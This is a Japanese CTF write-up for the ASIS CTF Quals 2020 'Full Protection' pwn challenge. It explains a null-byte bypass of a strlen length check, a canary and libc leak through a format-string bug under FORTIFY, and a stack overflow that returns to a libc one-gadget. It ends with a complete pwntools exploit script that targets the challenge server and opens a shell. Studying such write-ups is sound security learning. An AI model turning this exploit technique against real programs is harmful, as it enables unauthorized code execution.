---
tags: pwn
---

# ASIS CTF Quals 2020 - Full Protection

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

Fortify有効で`%i$p`のような書式が使えないので`%p`を沢山並べてカナリアとlibc leakをする。これを利用して次の入力でカナリアを破壊しないBOFを引き起こし、リターンアドレスを書き換える。

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

### Binary

非常にシンプルなバイナリ、main関数の定数定義等をすっ飛ばすとこんな感じ↓
```c
  while( true ) {
    iVar1 = readline(&local_58,0x40);
    if (iVar1 == 0) break;
    __printf_chk(1,&local_58);
    _IO_putc(10,stdout);
  }
```

`readline`はこんな感じ↓
```c
void readline(char *pcParm1,int iParm2)

{
  size_t sVar1;
  
  gets(pcParm1);
  sVar1 = strlen(pcParm1);
  if ((int)sVar1 < iParm2) {
    return;
  }
  puts("[FATAL] Buffer Overflow");
                    /* WARNING: Subroutine does not return */
  _exit(1);
}
```

何回でも入力を受け付けてそれをそのまま表示するという形である。
Fortifyで`printf`が`__printf_chk`に置き換えられているが引数だけ見れば自明なFSBがある

### strlenチェックの回避

まず`readline`から見ていくと`gets`関数が使われているので自明なBOFがある。
しかし、読み込み先のポインタが示す文字列の長さが`iParm2`を超えるとBOFを検知して終了する。`main`での呼び出しを見ると0x40バイト以上の読み込みを検知すると`_exit(1)`して終了する。読み込み先は`main`のスタック上であるがこの程度ではリターンアドレスの書き換えには及ばない。
しかし、文字列の長さ判定に`strlen`を用いているためヌルバイトを与えるとそこで止まる。したがって`gets`で先頭にヌルバイトを送り込んでおけば0文字入力としてこのチェックをバイパス出来る。というわけで`readline`で実質任意長のBOFが出来る。

### Fortify

ところでこのバイナリはSSPが有効であるので普通にBOFをさせただけではabortしてしまう。何度でも入力を受け付けるのでFSAでスタック上の値、つまりSSPで使われているカナリアを読み出してSSPを回避する。
今回は`__printf_chk(1, &local_58)`の部分にFSBがあるのでFSAができそうだがこれがFortifyで置き換えられた関数であるので`%i$p`のような特定箇所に絞った値を表示する書式が使えない。また、`%n`も使えない。
しかしバッファは潤沢にあるので`%p`を15個ぐらい並べることが出来、これでカナリアとリターンアドレスがリーク出来る。後者は`__libc_start_main+231`に相当するのでlibc leakも出来る。

### Payload

以上の考察を踏まえて、1回目に%pをたくさん並べてカナリアの値とlibcの配置先をリークする。これを使って2回目の入力でカナリアを壊さないようにBOFを引き起こし、One Gadgetをリターンアドレスに仕込んでシェルを取る。

ROPでも良い上に確実だと思うが面倒だった

## Code

```python
from pwn import p64, u64, remote, process, ELF


if __name__ == '__main__':
    target = "69.172.229.147"
    port = 9002
    libc = ELF("./libc-2.27.so")
    start_main_libc = libc.symbols["__libc_start_main"]
    offset = 231
    one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

    payloads = {
        "fsa": b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p",
        "rop": b""
    }

    # s = process("./fp_chall")
    s = remote(target, port)
    s.sendline(payloads["fsa"])
    res = s.recvline().split(b" ")
    canary = int(res[13][2:], 16)
    libc_addr = int(res[15][2:], 16) - start_main_libc - offset

    print(hex(canary))
    print(hex(libc_addr))

    payloads["rop"] = p64(0) * 9 + p64(canary) + p64(0) + p64(libc_addr + one_gadgets[1])

    s.sendline(payloads["rop"])

    s.interactive()

```

## Flag

`ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}`

## 作問者Writeup

* https://ptr-yudai.hatenablog.com/entry/2020/07/06/000622#53pts-Full-Protection-101-solves

## 感想

この企画やってる割に今回解けたPwnがこれだけというのがちょっと残念ですが解けてよかったです
CTF中の裏話をするとbabynoteはフラグ提出したチームメンバーのDronex君と一緒に考えていてカナリア中のバイトをfastbinのサイズヘッダとして利用する攻撃を思いついたんですが、スタックリークが厳しくて提案地点では失敗したのと、スタックリークは結局成功したんですが、Heapアドレスの頭が0x56になる方が可能性が高くてそちらで解く結果になりました(ちなみに0x55だとチャンクのフラグの都合で失敗するらしい)。
結局貢献は出来ませんでしたがカナリアのランダム性を利用してスタックで何か悪いことをするというのは今後の攻略/作問アイデアに取っておいて良いかもしれません(後者で使うことになったらこっそり消します)

あと明日のこの企画はおそらくbabynoteです